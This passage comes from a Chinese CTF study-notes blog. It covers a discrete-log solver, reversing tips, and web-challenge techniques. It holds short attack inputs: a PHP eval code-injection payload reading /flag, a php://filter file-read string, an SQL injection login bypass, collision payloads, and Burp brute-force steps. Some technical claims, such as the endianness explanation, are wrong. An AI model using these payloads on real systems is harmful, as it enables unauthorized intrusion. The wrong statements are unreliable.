<p>问了管理员才知道,能通过分解p的阶,也就是p-1,得到一堆小因子还有一个特别大的因子,然后通过这些小因子能合成出 $m\equiv y\mod \prod p_i^{x_i}$ ,其中pi可以任意选取(也就是即使一个小因子也是可以合成的,但是一个小因子提供的信息有限).脚本如下:(使用BSGS加快求解)<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt,prod</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">g,h,n,p</span>):</span><br><span class="line">	m=isqrt(n)+<span class="number">1</span>  <span class="comment"># 步长</span></span><br><span class="line">	baby_steps=defaultdict(<span class="built_in">int</span>)</span><br><span class="line">	current=<span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">		baby_steps[current]=j</span><br><span class="line">		current=(current*g)%p</span><br><span class="line">		<span class="keyword">if</span>(j%<span class="number">100000</span>==<span class="number">0</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	inv_g_m=<span class="built_in">pow</span>(g,-m,p)</span><br><span class="line">	current=h</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> current <span class="keyword">in</span> baby_steps:</span><br><span class="line">			j=baby_steps[current]</span><br><span class="line">			x=i*m+j</span><br><span class="line">			<span class="keyword">if</span> x&lt;n:</span><br><span class="line">				<span class="keyword">return</span> x</span><br><span class="line">		current=(current*inv_g_m)%p</span><br><span class="line">		<span class="keyword">if</span>(i%<span class="number">100000</span>==<span class="number">0</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;C&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;C&#x27;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 如果没有找到解</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_dlog_small_factor</span>(<span class="params">g,h,n,p</span>):</span><br><span class="line">	<span class="keyword">return</span> bsgs(g,h,n,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">p,y,fact</span>):</span><br><span class="line">	q=<span class="built_in">max</span>(fact)</span><br><span class="line">	small_factors=[f <span class="keyword">for</span> f <span class="keyword">in</span> fact <span class="keyword">if</span> f!=q]</span><br><span class="line">	<span class="comment"># 计算所有小因子的乘积N</span></span><br><span class="line">	N=prod(small_factors)</span><br><span class="line">	residues=[]  <span class="comment"># 存储余数d_i</span></span><br><span class="line">	moduli=[]  <span class="comment"># 存储模数n_i</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;计算m mod <span class="subst">&#123;N&#125;</span> (由<span class="subst">&#123;<span class="built_in">len</span>(small_factors)&#125;</span>个小因子组成)&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> i,n <span class="keyword">in</span> <span class="built_in">enumerate</span>(small_factors):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;处理因子 <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(small_factors)&#125;</span>: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">		M=(p-<span class="number">1</span>)//n</span><br><span class="line">		g_n=<span class="built_in">pow</span>(<span class="number">5</span>,M,p)</span><br><span class="line">		h_n=<span class="built_in">pow</span>(y,M,p)</span><br><span class="line">		d=solve_dlog_small_factor(g_n,h_n,n,p)</span><br><span class="line">		<span class="keyword">if</span> d <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">f&quot;无法求解因子 <span class="subst">&#123;n&#125;</span> 的离散对数&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">		residues.append(d)</span><br><span class="line">		moduli.append(n)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;  解得 m ≡ <span class="subst">&#123;d&#125;</span> (mod <span class="subst">&#123;n&#125;</span>)&quot;</span>)</span><br><span class="line">	<span class="comment"># 使用中国剩余定理组合所有结果</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;使用中国剩余定理组合所有同余式...&quot;</span>)</span><br><span class="line">	m_mod_N,_=crt(moduli,residues)</span><br><span class="line">	<span class="keyword">return</span> m_mod_N</span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="comment"># 这里需要提供实际的p和y值</span></span><br><span class="line">	p=</span><br><span class="line">	g=<span class="number">5</span></span><br><span class="line">	y=</span><br><span class="line">	h=</span><br><span class="line">	fact=[]</span><br><span class="line">	result=main(p,y,fact)</span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;m mod N = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;计算失败&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>然后我们审计pad函数,发现起会在末尾添加很多 <code>b&#39;r&#39;</code> ,且flag打头是 <code>Spirit&#123;</code> ,这给我们构造等差数列提供了契机,如下(后半段是手搓的):</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(...,<span class="number">10</span>**<span class="number">66</span>,...):</span><br><span class="line">	ct=long_to_bytes(m+i*prod)</span><br><span class="line">	<span class="keyword">if</span> ct.endswith(<span class="string">b&#x27;rrrrrrrrrrrrrrrrrrrrrrrrrr&#x27;</span>):</span><br><span class="line">		<span class="keyword">if</span> ct.startswith(<span class="string">b&#x27;Spirit&#123;&#x27;</span>):</span><br><span class="line">			<span class="built_in">print</span>(ct)</span><br><span class="line">		<span class="comment"># print(i)</span></span><br><span class="line">		<span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">			a=i</span><br><span class="line">		<span class="keyword">elif</span> b==<span class="number">0</span>:</span><br><span class="line">			b=i</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b-a)</span><br></pre></td></tr></table></figure>
<h2 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h2><p>使用 <code>!+[]()</code> 等几个字符实现全部js功能的加密方式.使用 <code>CPH Judge</code> 套上 <code>console.log()</code> 的壳直接跑.粘贴到浏览器会有很多问题,,又是禁止粘贴不明代码又是不信任啥的,怎么跑个代码这么难,死妈浏览器</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="IDA-EXE-ELF"><a href="#IDA-EXE-ELF" class="headerlink" title="IDA(EXE ELF)"></a>IDA(EXE ELF)</h2><p>用F5查看反汇编的C代码.<br>Shift+F12能查看字符串界面</p>
<p>IDA反编译的代码大部分可以直接粘到C++去跑,有一个特例: <code>4*i</code> 改成 <code>i</code> 是因为在反编译界面是按字节统计的,但是C++界面是正常的内存下标取址,取址公式不一样导致偏差.</p>
<p>IDA反编译的代码很原始,数组有可能在反汇编时拆成一堆变量,导致函数传参是数组但是表现为一个参数,发生”RE”.举例:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov  [ebp+var_20030], 5Ah ; <span class="string">&#x27;Z&#x27;</span>			v7[<span class="number">0</span>] = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">mov  [ebp+var_2002C], 4Ah ; <span class="string">&#x27;J&#x27;</span>			v7[<span class="number">1</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20028], 53h ; <span class="string">&#x27;S&#x27;</span>			v8    = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20024], 45h ; <span class="string">&#x27;E&#x27;</span>	asm		v9    = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20020], 43h ; <span class="string">&#x27;C&#x27;</span>	-&gt;		v10   = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">mov  [ebp+var_2001C], 61h ; <span class="string">&#x27;a&#x27;</span>	to		v11   = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20018], 4Eh ; <span class="string">&#x27;N&#x27;</span>	C++		v12   = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20014], 48h ; <span class="string">&#x27;H&#x27;</span>			v13   = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20010], 33h ; <span class="string">&#x27;3&#x27;</span>			v14   = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">mov  [ebp+var_2000C], 6Eh ; <span class="string">&#x27;n&#x27;</span>			v15   = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20008], 67h ; <span class="string">&#x27;g&#x27;</span>			v16   = <span class="string">&#x27;g&#x27;</span>;</span><br></pre></td></tr></table></figure><br>Shift+F12可以查看字符串区.</p>
<h3 id="IDA修改源文件"><a href="#IDA修改源文件" class="headerlink" title="IDA修改源文件"></a>IDA修改源文件</h3><p>在 <code>Edit-Patch peogram-Apply patches to ...</code> 点原程序保存即可.</p>
<h2 id="Jadx-gui-APK-CLASS"><a href="#Jadx-gui-APK-CLASS" class="headerlink" title="Jadx_gui(APK CLASS)"></a>Jadx_gui(APK CLASS)</h2><p>apk函数的main函数位于 <code>xxx.com</code> 里面的 <code>MainXxxx</code> .</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p><code>*11110100001010000101111#</code> 有可能是一个迷宫类型的题目.</p>
</li>
<li><p>端序:大端序:高位字节存在低地址处,低位字节存在高位地址处.(x86 arm)<br>小端序:高位字节存在高位字节处.(通过网络发送数据进行传输)<br>IDA的数据是大端序(比如 <code>char* arr=0x776F646168LL</code> )需要先转成char,即 <code>wodah</code> 然后再反转成 <code>hadow</code> 才是实际上字符串的样子.</p>
</li>
<li><p>常见函数的方向<br><code>strcat(a,b)</code> a&lt;-b 把b字符串加到a字符串末尾<br><code>strcpy(a,b)</code> a&lt;-b<br><code>a=join(b,c)</code> a&lt;-b+c 组合字符串<br><code>fill(a+1,a+1+n,b+1)</code> a&lt;-b</p>
</li>
</ol>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>Web低手.</p>
<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>dissearch路径扫描工具  </p>
<h2 id="常见路径"><a href="#常见路径" class="headerlink" title="常见路径"></a>常见路径</h2><p><code>/var/www/html/xxx.php</code> 一般放到这里意味着公网可访问  </p>
<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><ol>
<li>监听用法:开启本地代理,然后占一个端口.然后启动!,监听那个端口,然后所有经过的流量就都能被监听.(感觉原理是本地部署一个假的VPN网关)</li>
<li>修改Cookie用法:还是先启动,然后在页面找到Cookie(Raw)然后发送给Repeater,在这里能随意修改,改好之后点击Apply就能获得反应(flag居然这么神奇就出来了)</li>
<li>爆破id:使用内嵌浏览器,刷新页面收到一个请求,然后暴力枚举id,然后按照返回请求的长度排序,看最长的,然后找到Renderer(渲染器)得到flag.</li>
<li>爆破密码:同上</li>
<li>同时爆破密码和用户名:改成集束炸弹攻击  </li>
<li>记得右键改变文件头,不要自己修改,好像会加点东西进去.<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2>netcat指令,Windows有一个nc的实现,用法:cmd套一个nc64.exe<br>然后输入你想连的IP和端口,输入之后没反应,flag呢???<br>实际上你连接计算机之后,你这就是一个小的bash,你要输入指令获得flag.<h2 id="反弹shell-SSH反向Shell端口映射"><a href="#反弹shell-SSH反向Shell端口映射" class="headerlink" title="反弹shell SSH反向Shell端口映射"></a>反弹shell SSH反向Shell端口映射</h2>你用nc连接,对方主动监听你,监听成功后对方弹一个shell给你,所以是反向shell.</li>
</ol>
<p>首先cmd输入 <code>ipconfig</code> 查看自己的局域网ip地址.</p>
<h2 id="几个需要注意的类型"><a href="#几个需要注意的类型" class="headerlink" title="几个需要注意的类型"></a>几个需要注意的类型</h2><p><code>null</code> <code>nan</code> <code>0e18</code> <code>123abc</code> <code>[]</code> <code>&#123;&#125;</code> <code>inf</code></p>
<p>在JavaScript中这些特别的占位符分别是 <code>NaN</code> <code>undefined</code> <code>null</code> <code>Infinity</code> …</p>
<h2 id="md5-sha1强碰撞"><a href="#md5-sha1强碰撞" class="headerlink" title="md5,sha1强碰撞"></a>md5,sha1强碰撞</h2><p><code>md5</code> 强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">BBBBBBBB=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><code>SHA-1</code> 强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br><span class="line"></span><br><span class="line">BBBBBBBB=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuaile1314/p/11968108.html">ref1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120973888">ref2</a></p>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>使用py脚本远程连接服务器(代替nc指令)<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">conn=remote(<span class="string">&#x27;socket.cryptohack.org&#x27;</span>,<span class="number">11112</span>)</span><br><span class="line">conn=remote(<span class="string">&#x27;114.5.1.4&#x27;</span>,<span class="number">11112</span>)</span><br><span class="line">data_to_send = &#123;</span><br><span class="line">	<span class="string">&quot;buy&quot;</span>: <span class="string">&quot;flag&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 把json格式转成str格式</span></span><br><span class="line">json_data = json.dumps(data_to_send)</span><br><span class="line">conn.sendline(json_data.encode())<span class="comment"># 发送服务器的格式是byte,所以要encode</span></span><br><span class="line">response = conn.recvline().decode()<span class="comment"># 接收也是byte,转str要decode,recvall()是接收所有信息,recvall会一直接收</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Server response:&quot;</span>, response)</span><br><span class="line">conn.close() <span class="comment"># 关闭连接</span></span><br><span class="line"><span class="comment"># 此外conn还有一个recvuntil(str)判定指定字符串的,可以过滤废话</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    <span class="comment"># 导入 Pwntools 库</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)    <span class="comment"># 显示详细信息</span></span><br><span class="line">io = remote(host, port)    <span class="comment"># 与远程连接，host 与 port 分别填远程的地址与端口号</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 发送字节数据</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 发送的数据末尾带上回车（b&#x27;aaaa\n&#x27;）</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 接收到 b&#x27;&gt; &#x27; 之后再发送 b&#x27;aaaa&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 接收到 b&#x27;&gt; &#x27; 之后再发送 b&#x27;aaaa\n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">5</span>)    <span class="comment"># 接收 5 字节</span></span><br><span class="line">io.recvline()    <span class="comment"># 接收一行（接收到回车 b&#x27;\n&#x27; 为止）</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;abcd&#x27;</span>)    <span class="comment"># 接收到 b&#x27;abcd&#x27; 为止</span></span><br><span class="line"></span><br><span class="line">io.interactive()    <span class="comment"># 在终端与远程交互</span></span><br><span class="line"></span><br><span class="line">s=p32(num)<span class="comment"># 将int以小端序表示为bytes</span></span><br><span class="line">num=u32(s)<span class="comment"># 将bytes以小端序解码为int</span></span><br></pre></td></tr></table></figure><br>json交互<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">json_recv</span>():</span><br><span class="line">    line = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> json.loads(line.decode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_send</span>(<span class="params">hsh</span>):</span><br><span class="line">    request = json.dumps(hsh).encode()</span><br><span class="line">    r.sendline(request)</span><br></pre></td></tr></table></figure></p>
<h2 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h2><p>能够自定义好多协议的啥啥东西(http头字段),在这里写一点这么多多多选项都是啥.</p>
<ul>
<li>User-Agent 使用什么浏览器</li>
<li>DNT 希不希望被跟踪(1是不希望)</li>
<li>X-forwarded for 你上网的原始IP</li>
<li>Via 好像是服务器代理的url</li>
<li>Referer 该请求的来源</li>
</ul>
<p>然而Flu的hackbar总是莫名其妙卡死</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>php笑传之 <code>Capture Capture Bug</code> ,下文是代码简析.  </p>
<p>show<em>source(<em>_FILE</em></em>) :让背后php代码变得五颜六色,同时展示在前端.<br>include(“a.php”) :插入脚本.<br>/index.php :一个首页面.<br>/index.phps :后缀为phps的是存放php源代码的,但不是所有网站都有.  </p>
<ol>
<li>url编码:cyberchef的url编码有一个小锅,不会把字母数字也使用url编码,所以要使用burpsuite的编码器进行url编码.同时,浏览器键入的url会进行一层解码,所以记得再加一层</li>
<li>数字和字符串弱类型比较,如果字符串一定要比数字大可以构造一个比数字大的字符串,然后末尾添一个 <code>a</code> 表明这是个字符串绕过比较.</li>
<li>array_search搜字符串绕过:字符串与数字比较会转成0,然后0==0直接绕过返回true,需要搜索的字符串不一定要存在了.</li>
<li>php get传参 <code>/?a=112&amp;b[]=abc&amp;c=&#123;&quot;m&quot;:a,&quot;n&quot;=[[],0]&#125;</code> 上面表示了几种不同方式的参数传递.</li>
<li>伪协议… <code>php://xxx</code> 和 <code>data://xxx</code> 等多刷几个题再更</li>
<li>file协议:能把源文件变成base64格式再展示,省的有些flag被当成代码被处理掉了… <code>/?file=php://filter/convert.base64-encode/resource=flag.php</code></li>
</ol>
<h3 id="php审计"><a href="#php审计" class="headerlink" title="php审计"></a>php审计</h3><p>当你就剩一步的时候…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如何构造?答:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure></p>
<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>常见备份文件后缀名:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.bak</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.swp</span><br><span class="line">.bkf</span><br><span class="line">.bash_history</span><br><span class="line">.~</span><br></pre></td></tr></table></figure></p>
<h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>windows或Linux下:</p>
<p><code>command1 &amp;&amp; command2</code> 先执行command1,如果为真,再执行command2<br><code>command1 || command2</code> 先执行command1,如果为假,再执行command2  </p>
<p><code>command1 | command2</code> 只执行 command2<br><code>command1 &amp; command2</code> 先执行 command2 后执行 command1  </p>
<h2 id="Linux大杂烩"><a href="#Linux大杂烩" class="headerlink" title="Linux大杂烩"></a>Linux大杂烩</h2><p>学Web不可避免的温习Linux.</p>
<ol>
<li><code>ls /</code> 意思是 <code>ls ~/</code> .</li>
<li><code>/home</code> 是用户主工作目录.<h2 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h2>首先确认是使用什么闭合的,比如 <code>&#39;</code> 或者 <code>&quot;</code> (方法:输入带 <code>&#39;</code> 或 <code>&quot;</code> 的账号看报错).</li>
</ol>
<p>然后使用<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/485448815">万能密码</a>:<br><code>账户</code>: <code>a&#39; or true #</code> 由于#会当成特殊字符,要使用url编码 <code>a&#39; or true %23</code><br><code>密码</code>: <code>a&#39; or true #</code> 由于#会当成特殊字符,要使用url编码 <code>a&#39; or true %23</code></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><a target="_blank" rel="noopener" href="https://https//www.cjovi.icu/">大佬博客</a>  </p>
<h2 id="PRE"><a href="#PRE" class="headerlink" title="PRE"></a>PRE</h2><p>常见问题Q&amp;A(其实只是Flu自己比较好奇):</p>
<ol>
<li><p>这个CTF网站是拿什么做的?有没有模板?</p>
<blockquote>
<p>A:有的.当前Spirit队用的好像是是ctfd,其他也有做的好的,比如ret2shell(平台会自动生成一个flag,并且挂载在/flag下)</p>
</blockquote>
</li>
<li><p>可不可以做到每个人拿到的源文件的zip都不一样?</p>
<blockquote>
<p>A:可以的,这个叫动态附件</p>
</blockquote>
</li>
<li><p>那些需要容器的题是怎么回事?</p>
<blockquote>
<p>A:Docker.</p>
</blockquote>
</li>
<li><p>PWN题假如程序被干崩了会发生什么?</p>
<blockquote>
<p>A:有socat,每次访问都会开一个新的程序.</p>
</blockquote>
</li>
<li><p>那么,程序的基址是固定的情况下,为什么并发访问这多个程序不会出错?</p>
<blockquote>
<p>A:虚拟地址…(寻址可以达到2^64就是因为上述理论均建立在虚拟内存的条件下)在这个时候程序的地址(虚拟地址)=基址+偏移,多个程序会直接换页表</p>
</blockquote>
</li>
</ol>
